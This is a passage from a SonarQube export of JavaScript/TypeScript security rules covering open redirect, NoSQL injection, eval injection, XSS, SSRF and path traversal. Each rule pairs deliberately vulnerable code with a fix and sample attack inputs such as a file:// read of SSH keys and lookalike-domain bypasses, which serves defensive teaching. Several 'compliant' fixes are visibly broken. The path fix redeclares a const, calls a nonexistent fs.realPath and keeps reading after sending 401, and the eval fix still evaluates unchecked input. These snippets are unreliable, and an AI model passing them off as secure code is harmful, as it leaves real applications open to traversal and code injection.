neutralized.<br> Argument delimiters count <code>'</code>, <code>-</code> and spaces.</p>
<p>For example, the <code>find</code> command from UNIX supports the dangerous argument <code>-exec</code>.<br> In this case, option processing can be
terminated with a string containing <code>--</code> or with special options. For example, <code>git</code> supports <code>--end-of-options</code> <a
href="https://github.blog/2019-11-03-highlights-from-git-2-24/#tidbits">since its version 2.24</a>.</p>
<p>In the example compliant code, the <code>spawn</code> function from <code>child_process</code> is used in place of its less secure
<code>exec</code> counterpart. It accepts command arguments as an array and performs a proper escaping of its element before building the command line
to run.</p>
<h4>Disable shell integration</h4>
<p>In most cases, command execution libraries propose two ways to execute external program: with or without shell integration.</p>
<p>When shell integration is allowed, an attacker with control over the command arguments can simply execute additional external programs using system
shell features. For example, on Unix, command pipelining (<code>|</code>) or string interpolation (<code>$()</code>, <code>&lt;()</code>, etc.) can be
used to break out of a command call.</p>
<p>Therefore, it is generally preferable to disable shell integration.</p>
<p>The <code>spawn</code> function that is used in the example compliant code disables shell integration by default.</p>
<h3>Pitfalls</h3>
<h4>Loose typing</h4>
<p>Because JavaScript is a loosely typed language, extra care should be taken when accepting user-controlled parameters. Indeed, some methods, that
can be used to sanitize untrusted parameters, sometimes accept both objects and object arrays.</p>
<p>For example, the <code>Array.concat</code> function accepts an array as argument and will append all of its elements to its target. When an
untrusted parameter is an array, while a single string was expected, using <code>concat</code> to build a command argument list can result in an
arbitrary argument injection.</p>
<p>It is therefore of prime importance to check the type of untrusted parameters before processing them.</p>
<p>In the above compliant code example, the ambiguous <code>concat</code> function is used. However, a type check has been introduced to prevent any
unexpected issue.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html">OWASP, OS Command Injection Defense
  Cheaty Sheet</a> </li>
  <li> <a href="https://gtfobins.github.io/#+shell">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>
  <li> <a href="https://lolbas-project.github.io/#">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/78">CWE-78 - Improper Neutralization of Special Elements used in an OS Command</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S6105">
              tssecurity:S6105
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Open redirection occurs when an application uses user-controllable data to build URLs used during redirects.</p>
<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as
<code>https://trusted.example.com/redirect?url=evil.com</code>, to redirect the victim to their evil domain.</p>
<p>Open redirection is most often used to trick users into browsing to a malicious domain that they believe is safe. As such, attackers commonly use
open redirect exploits in mass phishing campaigns.</p>
<h3>What is the potential impact?</h3>
<p>An attacker can use this vulnerability to redirect a user from a trusted domain to a malicious domain controlled by the attacker. At that point,
the attacker can perform various attacks, such as phishing.</p>
<p>Below are some scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Phishing</h4>
<p>Suppose the attacker creates a malicious website that mirrors the interface of the trusted website. In that case, they can use the open redirect
vulnerability to lead the user to this malicious site.</p>
<p>Due to the similarity in the application appearance and the supposedly trustable hyperlink, the user fails to identify that they are browsing on a
malicious domain. From here, an attacker can capture the user’s credentials, bypass Multi-Factor Authentication (MFA), and take over the user’s
account on the trusted website.</p>
<h4>Malware distribution</h4>
<p>By leveraging the domain mirroring technique explained above, the attacker could also create a website that hosts malware. A user who is unaware of
the redirection from a trusted website to this malicious website might then download and execute the attacker’s malware. In the worst case, this can
lead to a complete system compromise for the user.</p>
<h4>JavaScript injection (XSS)</h4>
<p>In certain circumstances, an attacker can use DOM-based open redirection to execute JavaScript code. This can lead to further exploitation in the
trusted domain and has consequences such as the compromise of the user’s account.</p>
<h2>How to fix it in DOM API</h2>
<h3>Code examples</h3>
<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used
to redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>
<h4>Noncompliant code example</h4>
<p>The following example is vulnerable to open redirection through the following URL:
<code>https://example.com/redirect?url=https://evil.com</code>;</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
const queryParams = new URLSearchParams(document.location.search);
const redirectUrl = queryParams.get("url");
document.location = redirectUrl; // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const queryParams = new URLSearchParams(document.location.search);
const redirectUrl = queryParams.get("url");

if (redirectUrl.startsWith("https://www.example.com/")) {
    document.location = redirectUrl;
}
</pre>
<h3>How does this work?</h3>
<p>Most client-side frameworks, such as <code>Vue.js</code> or <code>React.js</code>, provide built-in redirection methods. Those should be preferred
as they often provide additional security mechanisms. However, these built-in methods are usually engineered for internal page redirections. Thus,
they might not solve the reader’s use case.</p>
<p>In case the application strictly requires external redirections based on user-controllable data, the following should be done instead:</p>
<ol>
  <li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls.) </li>
  <li> Using an allowlist approach in case the destination URLs are multiple but limited. </li>
  <li> Adding a dynamic confirmation dialog, warning about the imminent action and requiring manual authorization to proceed to the actual
  redirection. </li>
</ol>
<h3>Pitfalls</h3>
<h4>The trap of <code>String.startsWith</code> and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator character (i.e., a <code>/</code>) as the last character</strong>.</p>
<p>When this character is not present, attackers may be able to register a specific domain name that both passes validation and is controlled by
them.</p>
<p>For example, when validating the <code>https://example.com</code> domain, suppose an attacker owns the <code>https://example.evil</code> domain. If
the prefix-based validation is implemented incorrectly, they could create a <code>https://example.com.example.evil</code> subdomain to abuse the
broken validation.</p>
<p>The practice of taking over domains that maliciously look like existing domains is widespread and is called <a
href="https://en.wikipedia.org/wiki/Cybersquatting">cybersquatting</a>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/601">CWE-601 - URL Redirection to Untrusted Site ('Open Redirect')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S5147">
              tssecurity:S5147
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>NoSQL injections occur when an application retrieves untrusted data and inserts it into a database query without sanitizing it first.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application that is vulnerable to NoSQL injection:<br> After discovering the injection point, attackers insert data into
the vulnerable field to execute malicious commands in the affected databases.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Identity spoofing and data leakage</h4>
<p>In the context of simple query logic breakouts, a malicious database query enables privilege escalation or direct data leakage from one or more
databases.<br> This threat is the most widespread impact.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the
attacked organization does not maintain a disaster recovery plan (DRP) as missing data can disrupt the regular operations of an organization.</p>
<h4>Chaining NoSQL injections with other vulnerabilities</h4>
<p>Attackers who exploit NoSQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some
defense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple
attacks with great impact:</p>
<ul>
  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>
  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE). </li>
</ul>
<h2>How to fix it in MongoDB</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to a NoSQL injection because the database query is built using untrusted JavaScript objects that are extracted
from user inputs.</p>
<p>Here the application assumes the user-submitted parameters are always strings, while they might contain more complex structures. An array or
dictionary input might tamper with the expected query behavior.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const { MongoClient } = require('mongodb');

function (req, res) {
    let query = { user: req.query.user, city: req.query.city };

    MongoClient.connect(url, (err, db) =&gt; {
        db.collection("users")
        .find(query) // Noncompliant
        .toArray((err, docs) =&gt; { });
    });
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const { MongoClient } = require('mongodb');

function (req, res) {
    let query = { user: req.query.user.toString(), city: req.query.city.toString() };

    MongoClient.connect(url, (err, db) =&gt; {
        db.collection("users")
        .find(query)
        .toArray((err, docs) =&gt; { });
    });
}
</pre>
<h3>How does this work?</h3>
<h4>Use only plain string values</h4>
<p>With MongoDB, NoSQL injection can arise when attackers are able to inject objects in the query instead of plain string values. For example, using
the object <code>{ $ne: "" }</code> in a field of a <code>find</code> query, will return every entry where the field is not empty.</p>
<p>Some JavaScript application servers enable "extended" syntax that serializes URL query parameters into JavaScript objects or arrays. This allows
attackers to control all the fields of an object. In express.js, this "extended" syntax <a
href="https://expressjs.com/en/4x/api.html#express.urlencoded">is enabled by default</a>.</p>
<p>Before using any untrusted value in a MongoDB query, make sure it is a plain string and not a JavaScript object or an array.</p>
<p>In some cases, this will not be enough to protect against all attacks and strict validation needs to be applied (see the "Pitfalls" section)</p>
<h3>Pitfalls</h3>
<h4>Code execution</h4>
<p>When untrusted data is used within query operators such as <code>$where</code>, <code>$accumulator</code>, or <code>$function</code> it usually
results in JavaScript code execution vulnerabilities.</p>
<p>Therefore, untrusted values should not be used inside these query operators unless they are properly validated.</p>
<p>For more information about MongoDB code execution vulnerabilities, see rule <a href='/organizations/sopra-steria/rules?open=typescript%3AS5334&rule_key=typescript%3AS5334'>S5334</a>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/nosql-injections-in-rocket-chat/">SonarSource, NoSQL Injections in Rocket.Chat 3.12.1</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/943">CWE-943 - Improper Neutralization of Special Elements in Data Query Logic</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S5334">
              tssecurity:S5334
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Code injections occur when applications allow the dynamic execution of code instructions from untrusted data.<br> An attacker can influence the
behavior of the targeted application and modify it to get access to sensitive data.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting a dynamic code injection vulnerability will be able to execute arbitrary code in the context of the vulnerable
application.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process that executes the code
runs with root privileges, and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul>
  <li> download the internal server’s data, most likely to sell it </li>
  <li> modify data, send malware </li>
  <li> stop services or exhaust resources (with fork bombs for example) </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of code injections and <strong>misconfiguration</strong> of:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to arbitrary code execution because it dynamically runs JavaScript code built from untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
function (req, res) {
    let operation = req.query.operation
    eval(`product_${operation}()`) // Noncompliant
    res.send("OK")
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
const allowed = ["add", "remove", "update"]

let operationId = req.query.operationId
const operation = allowed[operationId]
eval(`product_${operation}()`)
res.send("OK")
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>
<p>Anything that can be done via dynamic code execution can usually be done via a language’s native SDK and static code.<br> Therefore, our suggestion
is to avoid executing code dynamically.<br> If the application requires the execution of dynamic code, additional security measures must be taken.</p>
<h4>Dynamic parameters</h4>
<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the
dynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic
code and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and
perform the processing.</p>
<h4>Allow list</h4>
<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage
using an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>
<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the
parameter is accepted. Otherwise, it is rejected and an error is raised.</p>
<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where
only valid ones can be converted to a safe value.</p>
<p>The example compliant code uses such a binding approach.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/moodle-remote-code-execution/">SonarSource, Evil Teacher: Code Injection in Moodle</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/95">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval
  Injection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S5131">
              tssecurity:S5131
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible to temporarily execute JavaScript code in the context of the application, granting access to the session of
the victim. This is possible because user-provided data, such as URL parameters, are copied into the HTML body of the HTTP response that is sent back
to the user.</p>
<h2>Why is this an issue?</h2>
<p>Reflected cross-site scripting (XSS) occurs in a web application when the application retrieves data like parameters or headers from an incoming
HTTP request and inserts it into its HTTP response without first sanitizing it. The most common cause is the insertion of GET parameters.</p>
<p>When well-intentioned users open a link to a page that is vulnerable to reflected XSS, they are exposed to attacks that target their own
browser.</p>
<p>A user with malicious intent carefully crafts the link beforehand.</p>
<p>After creating this link, the attacker must use phishing techniques to ensure that his target users click on the link.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but it can also be arbitrary code
that can be interpreted by the target user’s browser, such as HTML, CSS, or JavaScript.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Vandalism on the front-end website</h4>
<p>The malicious link defaces the target web application from the perspective of the user who is the victim. This may result in loss of integrity and
theft of the benevolent user’s data.</p>
<h4>Identity spoofing</h4>
<p>The forged link injects malicious code into the web application. The code enables identity spoofing thanks to cookie theft.</p>
<h4>Record user activity</h4>
<p>The forged link injects malicious code into the web application. To leak confidential information, attackers can inject code that records keyboard
activity (keylogger) and even requests access to other devices, such as the camera or microphone.</p>
<h4>Chaining XSS with other vulnerabilities</h4>
<p>In many cases, bug hunters and attackers chain cross-site scripting vulnerabilities with other vulnerabilities to maximize their impact.<br> For
example, an XSS can be used as the first step to exploit more dangerous vulnerabilities or features that require higher privileges, such as a code
injection vulnerability in the admin control panel of a web application.</p>
<h2>How to fix it in Express.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to cross-site scripting because it returns an HTML response that contains unsanitized user input.</p>
<p>If you do not intend to send HTML code to clients, the vulnerability can be fixed by specifying the type of data returned in the response. For
example, you can use the <code>JsonResponse</code> class to safely return JSON messages.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
function (req, res) {
    json = JSON.stringify({ "data": req.query.input });
    res.send(json);
};
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
function (req, res) {
    res.json({ "data": req.query.input });
};
</pre>
<p>It is also possible to set the content-type header manually using the <code>content_type</code> parameter when creating an
<code>HttpResponse</code> object.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="2" data-diff-type="noncompliant">
function (req, res) {
    res.send(req.query.input);
};
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="2" data-diff-type="compliant">
function (req, res) {
    res.set('Content-Type', 'text/plain');
    res.send(req.query.input);
};
</pre>
<h3>How does this work?</h3>
<p>In case the response consists of HTML code, it is highly recommended to use a template engine like <a href="https://ejs.co/">ejs</a> to generate
it. This template engine separates the view from the business logic and automatically encodes the output of variables, drastically reducing the risk
of cross-site scripting vulnerabilities.</p>
<p>If you do not intend to send HTML code to clients, the vulnerability can be resolved by telling them what data they are receiving with the
<code>content-type</code> HTTP header. This header tells the browser that the response does not contain HTML code and should not be parsed and
interpreted as HTML. Thus, the HTTP response is not vulnerable to reflected Cross-Site Scripting.</p>
<p>For example, setting the content-type header to <code>text/plain</code> allows to safely reflect user input since browsers will not try to parse
and execute the response.</p>
<h3>Pitfalls</h3>
<h4>Content-types</h4>
<p>Be aware that there are more content-types than <code>text/html</code> that allow to execute JavaScript code in a browser and thus are prone to
cross-site scripting vulnerabilities.<br> The following content-types are known to be affected:</p>
<ul>
  <li> application/mathml+xml </li>
  <li> application/rdf+xml </li>
  <li> application/vnd.wap.xhtml+xml </li>
  <li> application/xhtml+xml </li>
  <li> application/xml </li>
  <li> image/svg+xml </li>
  <li> multipart/x-mixed-replace </li>
  <li> text/html </li>
  <li> text/rdf </li>
  <li> text/xml </li>
  <li> text/xsl </li>
</ul>
<h4>The limits of validation</h4>
<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the
recommended approach.</p>
<p>As an example, filtering out user inputs based on a deny-list will never fully prevent XSS vulnerability from being exploited. This practice is
sometimes used by web application firewalls. It is only a matter of time for malicious users to find the exploitation payload that will defeat the
filters.</p>
<p>Another example is applications that allow users or third-party services to send HTML content to be used by the application. A common approach is
trying to parse HTML and strip sensitive HTML tags. Again, this deny-list approach is vulnerable by design: maintaining a list of sensitive HTML tags,
in the long run, is very difficult.</p>
<p>A preferred option is to use Markdown in conjunction with a parser that removes embedded HTML and restricts the use of "javascript:" URI.</p>
<h3>Going the extra mile</h3>
<h4>Content Security Policy (CSP) Header</h4>
<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to
<strong>block</strong> loading data that does not meet the application’s security requirements. If configured correctly, this can prevent any attempt
to exploit XSS in the application.<br> <a href="https://web.dev/csp-xss/">Learn more here.</a></p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet</a> - XSS
  Prevention Cheat Sheet </li>
  <li> <a href="https://expressjs.com/en/api.html">Express, 4.x API</a> </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/wordpress-stored-xss-vulnerability">SonarSource, WordPress 5.8.2 Stored XSS Vulnerability</a> </li>
  <li> <a href="https://blog.sonarsource.com/ghost-admin-takeover">SonarSource, Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li>
  <li> <a href="https://samy.pl/myspace/">Samy Kamkar, The MySpace Worm</a> </li>
</ul>
<h3>Conference presentations</h3>
<ul>
  <li> <a href="https://www.youtube.com/watch?v=ksq7e6UUDag">DEF CON Safe Mode Red Team Village, Ray Doyle, Weaponized XSS Moving Beyond Alert</a>
  </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S5144">
              tssecurity:S5144
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Server-Side Request Forgery (SSRF) occurs when attackers can coerce a server to perform arbitrary requests on their behalf.<br></p>
<p>An SSRF vulnerability can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s
response.<br> The absence of the corresponding response for the coerced request on the application is not a barrier to exploitation and thus must be
treated in the same way as basic SSRF.</p>
<h3>What is the potential impact?</h3>
<p>SSRF usually results in unauthorized actions or data disclosure in the vulnerable application or on a different system it can reach. Conditional to
what is reachable, remote command execution can be achieved, although it often requires chaining with further exploitations.</p>
<p>Information disclosure is SSRF’s core outcome. Depending on the extracted data, an attacker can perform a variety of different actions that can
range from low to critical severity.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Local file read to host takeover</h4>
<p>An attacker manipulates an application into performing a local request for a sensitive file, such as <code>~/.ssh/id_rsa</code>, by using the File
URI scheme <code>file://</code>.<br> Once in possession of the SSH keys, the attacker establishes a remote connection to the system hosting the web
application.</p>
<h4>Internal Network Reconnaissance</h4>
<p>An attacker enumerates internal accessible ports from the affected server or others to which the server can communicate by iterating over the port
field in the URL <code>http://127.0.0.1:{port}</code>.<br> Taking advantage of other supported URL schemas (dependent on the affected system), for
example, <code>gopher://127.0.0.1:3306</code>, an attacker would be able to connect to a database service and perform queries on it.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to SSRF as it opens a URL defined by untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const axios = require('axios');
const express = require('express');

const app = express();

app.get('/example', async (req, res) =&gt; {
    try {
        await axios.get(req.query.url); // Noncompliant
        res.send("OK");
    } catch (err) {
        console.error(err);
        res.send("ERROR");
    }
})
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const axios = require('axios');
const express = require('express');

const schemesList = ["http:", "https:"];
const domainsList = ["trusted1.example.com", "trusted2.example.com"];

app.get('/example', async (req, res) =&gt; {
    const url = (new URL(req.query.url));

    if (schemesList.includes(url.protocol) &amp;&amp; domainsList.includes(url.hostname)) {
        try {
            await axios.get(url);
            res.send("OK");
        } catch (err) {
            console.error(err);
            res.send("ERROR");
        }
    }else {
        res.send("INVALID_URL");
    }
})
</pre>
<h3>How does this work?</h3>
<h4>Pre-Approved commands</h4>
<p>Create a list of authorized and secure URLs that you want the application to be able to request.<br> If a user input does not match an entry in
this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h3>Pitfalls</h3>
<h4>The trap of 'StartsWith' and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>
<p>If the validation string does not contain a terminating path separator, the SSRF vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith("https://example.com")</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.commit.malicious.io</code>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/">Top 10 2021 Category A10 - Server-Side Request
  Forgery (SSRF)</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/918">CWE-918 - Server-Side Request Forgery (SSRF)</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S2083">
              tssecurity:S2083
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Path injections occur when an application uses untrusted data to construct a file path and access this file without validating its path first.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initial intended path. The resulting
path would resolve somewhere in the filesystem where the user should not normally have access to.</p>
<h3>What is the potential impact?</h3>
<p>A web application is vulnerable to path injection and an attacker is able to exploit it.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
root privileges on Linux, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Override or delete arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to delete or write into. The vulnerability is exploited
to remove or corrupt files that are critical for the application or for the system to work properly.</p>
<p>It could result in data being lost or the application being unavailable.</p>
<h4>Read arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to read and output. The vulnerability is exploited to
leak the content of arbitrary files from the file system, including sensitive files like SSH private keys.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to path injection as it creates a path using untrusted data without validation.</p>
<p>An attacker can exploit the vulnerability in this code to read arbitrary files.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
const path = require('path');
const fs   = require('fs');

function (req, res) {
  const targetDirectory = "/data/app/resources/";
  const userFilename = path.join(targetDirectory, req.query.filename);

  let data = fs.readFileSync(userFilename, { encoding: 'utf8', flag: 'r' }); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
const path = require('path');
const fs   = require('fs');

function (req, res) {
  const targetDirectory = "/data/app/resources/";
  const userFilename = path.join(targetDirectory, req.query.filename);
  const userFilename = fs.realPath(userFilename);

  if (!userFilename.startsWith(targetDirectory)) {
    res.status(401).send();
  }

  let data = fs.readFileSync(userFilename, { encoding: 'utf8', flag: 'r' });
}
</pre>
<h3>How does this work?</h3>
<h4>Canonical path validation</h4>
<p>If it is impossible to use secure-by-design APIs that do this automatically, the universal way to prevent path injection is to validate paths
constructed from untrusted data:</p>
<ol>
  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <code>/base/dirmalicious</code>
  starts with <code>/base/dir</code> but does not start with <code>/base/dir/</code>. </li>
  <li> Resolve the canonical path of the file by using methods like <code>`fs.realPath`</code>. This will resolve relative path or path components
  like <code>../</code> and removes any ambiguity regarding the file’s location. </li>
  <li> Check that the canonical path is within the directory where the file should be located. </li>
</ol>
<p><strong>Important Note</strong>: The order of this process pattern is important. The code must follow this order exactly to be secure by
design:</p>
<ol>
  <li> <code>data = transform(user_input);</code> </li>
  <li> <code>data = normalize(data);</code> </li>
  <li> <code>data = sanitize(data);</code> </li>
  <li> <code>use(data);</code> </li>
</ol>
<p>As pointed out in <a href="https://www.youtube.com/watch?v=V-DdcKADnFk">this SonarSource talk</a>, failure to follow this exact order leads to
security vulnerabilities.</p>
<h3>Pitfalls</h3>
<h4>Partial Path Traversal</h4>
<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation string contains a path
separator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a
path separator as the last character of the validation strings.</p>
<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>targetDirectory</code> does not end with a path
separator:</p>
<pre>
const path = require('path');

function (req, res) {
  const targetDirectory = "/data/app/resources"
  const userFilename = path.join(targetDirectory, req.query.filename));
  const userFilename = fs.realPath(userFilename);

  if (!userFilename.startsWith(targetDirectory)) {
    res.status(401).send();
  }

  let data = fs.readFileSync(userFilename);
}
</pre>
